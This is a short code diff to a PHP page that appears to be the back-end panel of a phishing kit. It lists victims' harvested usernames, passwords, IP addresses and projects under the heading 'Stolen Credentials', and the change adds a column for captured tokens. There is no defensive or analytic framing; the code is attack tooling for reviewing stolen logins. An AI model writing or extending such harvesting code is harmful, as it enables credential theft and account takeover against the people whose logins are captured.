@@ -266,12 +266,12 @@ $result = $conn->query($sql);
 
 ?>
     <h2><FONT COLOR="#FFFFFF">Stolen Credentials</FONT></h2>
-<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH></TR>
+<TABLE BORDER=1><TR><TH>Username</TH><TH>Password</TH><TH>Time</TH><TH>IP</TH><TH>Project</TH><TH>Token</TH></TR>
 <?php
     // output data of each row
     while($row = $result->fetch_assoc()) {
 //$pw = $row["pass"];
-echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td></tr>";
+echo "<tr><td>".$row["username"]."</td><td>".$row["password"]."</td><td>".$row["entered"]."</td><td>".$row["ip"]."</td><td>".$row["location"]."</td><td>".$row["token"]."</td></tr>";
     }
 
 printf($conn->error);
